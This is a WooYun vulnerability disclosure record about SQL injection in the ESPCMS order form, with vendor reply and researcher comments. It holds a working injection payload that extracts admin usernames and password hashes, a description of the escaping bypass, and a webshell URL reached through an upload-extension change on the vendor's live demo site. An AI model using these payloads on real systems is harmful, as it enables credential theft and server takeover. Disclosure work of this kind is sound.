{"id": 44621, "wybug_id": "wooyun-2015-092449", "wybug_title": "易思ESPCMS sql注入漏洞（绕过阿里云盾demo站成功拿下shell同时影响到主站）", "wybug_corp": "易思ESPCMS企业网站管理系统", "wybug_author": "Pany自留地", "wybug_date": "2015-01-19 14:53", "wybug_open_date": "2015-04-20 14:22", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-03-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-20：\t细节向公众公开  简要描述： 前台提交订单处. 详细说明：  /interface/order.php\n$db_values = '';\t\t\t$arraycount = count($did) - 1;\t\t\tforeach ($did as $key => $value) {\t\t\t\t$value = intval($value);\t\t\t\t$oprice[$key] = floatval($oprice[$key]);\t\t\t\t$bprice[$key] = floatval($bprice[$key]);\t\t\t\t$countprice[$key] = floatval($countprice[$key]);\t\t\t\t$amount[$key] = intval($amount[$key]);\t\t\t\tif ($key == $arraycount) {\t\t\t\t\t$db_values.= \"($insert_id,$value,'$tsn[$key]','$ptitle[$key]',$oprice[$key],$bprice[$key],$countprice[$key],$amount[$key],1)\";\t\t\t\t} else {\t\t\t\t\t$db_values.= \"($insert_id,$value,'$tsn[$key]','$ptitle[$key]',$oprice[$key],$bprice[$key],$countprice[$key],$amount[$key],1),\";\t\t\t\t}\t\t\t}\t\t\t$db_field = 'oid,did,tsn,title,oprice,bprice,countprice,amount,inventory';\t\t\t$this->db->query('INSERT INTO ' . $db_table2 . ' (' . $db_field . ') VALUES ' . $db_values);\n$ptitle,$tsn都可控，直接带入insert。正常提交\nPOST /index.php?ac=order&at=ordersave HTTP/1.1Host: demo.ecisp.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://demo.ecisp.cn/index.php?ac=order&at=orderpayCookie: /**/Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 426userid=409&productmoney=33600&discount_productmoney=33600&discountmoney=0&tokenkey=98b9b2dbbda63c317b3f9ab9c370a47b&ptitle%5B%5D=ESPCMS%E5%BC%80%E5%8F%91%E7%89%88&tsn%5B%5D=SN20140706215345387&bprice%5B%5D=16800.00&oprice%5B%5D=16800.00&did%5B%5D=30&amount%5B%5D=2&countprice%5B%5D=33600.00&osid=1&opid=1&alias=wooyun&sex=0&email=asd%40qq.com&tel=123&mobile=123&address=test&zipcode=0&sendtime=1&content=&invpayee=&invcontent=\n\n$ptitle = $this->fun->accept('ptitle', 'P');$tsn = $this->fun->accept('tsn', 'P');\n来看看accept()\nfunction accept($k, $var = 'R', $htmlcode = true, $rehtml = false) {\t\tswitch ($var) {\t\t\tcase 'G':\t\t\t\t$var = &$_GET;\t\t\t\tbreak;\t\t\tcase 'P':\t\t\t\t$var = &$_POST;\t\t\t\tbreak;\t\t\tcase 'C':\t\t\t\t$var = &$_COOKIE;\t\t\t\tbreak;\t\t\tcase 'R':\t\t\t\t$var = &$_GET;\t\t\t\tif (empty($var[$k])) {\t\t\t\t\t$var = &$_POST;\t\t\t\t}\t\t\t\tbreak;\t\t}\t\t$putvalue = isset($var[$k]) ? $this->daddslashes($var[$k], 0) : NULL;\t\treturn $htmlcode ? ($rehtml ? $this->preg_htmldecode($putvalue) : $this->htmldecode($putvalue)) : $putvalue;\t}\n这里会把提交的数据转义，但是当$tsn不是数组的时候是这样的$temp = \"wooyun\"$temp[0]的值为wplayload构造：$tsn参数提交一个' daddslashes（espcms重写的addslashes）将其转义成\\'取$tsn[0]，为\\\nuserid=1&productmoney=16800&discount_productmoney=16800&discountmoney=0&ptitle[]=,(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#&tsn='&bprice[]=16800.00&oprice[]=16800.00&did[]=30&amount[]=1&countprice[]=16800.00&osid=1&opid=1&alias=wooyun&sex=0&email=awsedr@q.com&tel=10010&mobile=&address=china&zipcode=0&sendtime=1&content=&invpayee=&invcontent=\n查看订单：\n\nsql语句相当于\nINSERT INTO espcms_order_info (oid,did,tsn,title,oprice,bprice,countprice,amount,inventory) VALUES (10,30,'\\',',(SELECT CONCAT(USERNAME,0x2f,PASSWORD) FROM espcms_admin_member ),1,1,1,1,1)#',16800,16800,16800,1,1)\n官方DEMO测试：由于官方demo有阿里的防火墙，我就分两次来获取\n第一条SELECT USERNAME FROM espcms_admin_member第二条：SELECT PASSWORD FROM espcms_admin_member\n\n\n\n\n\n\n说说getshell，demo上upfile文件夹是没有写入权限的，datacache是没有运行php的权限,而且无法编辑模板，但文件后缀能在后台修改，上传文件的目录可控，所以能拿下shell.\n\nhttp://demo.ecisp.cn/html/wooyun.php?cmd=phpinfo();还有一个更加严重的问题，就是DEMO站和主站的隔离没做好。至于主站我就没深入了本次测试不涉及数据之类的，厂商可以查看服务器日志。\n\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  主站和DEMO站的隔离要做好。问题已经指出，代码方面的你们懂得。 :)   版权声明：转载请注明来源 Pany自留地@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-01-19 16:53 厂商回复： 我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-19 14:59 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  简要描述为何这么亮    \n     2015-01-19 15:07 |    \t\tJJ Fly \t\t\t( 普通白帽子  |\t\t\t        Rank:317 漏洞数:59        | 今天播下一颗种子。)\t\t \n  我记得之前的，订单cookie可以逆向，新版本就没看过了。    \n     2015-01-19 15:11 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  目测算法 要不就是[$key] offset    \n     2015-01-19 16:58 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @′雨。 不然过不了墙    \n     2015-01-19 17:01 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  坐等公开！    \n     2015-02-08 17:05 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  →_→  被三楼的我猜对了。。。。    \n     2015-02-09 11:27 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  顶    \n     2015-02-12 14:59 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  http://wooyun.org/bugs/wooyun-2014-068516卧槽,为何厂商不给这么搞的rank？？？    \n     2015-02-13 11:15 |    \t\tPany自留地 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:29        | 0day just like a joke.)\t\t \n  @Noxxx  估计是你没深入啊。。这个主站。。    \n     2015-02-28 15:55 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n   WooYun: espcms sql注入漏洞   这几个不是一个洞？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}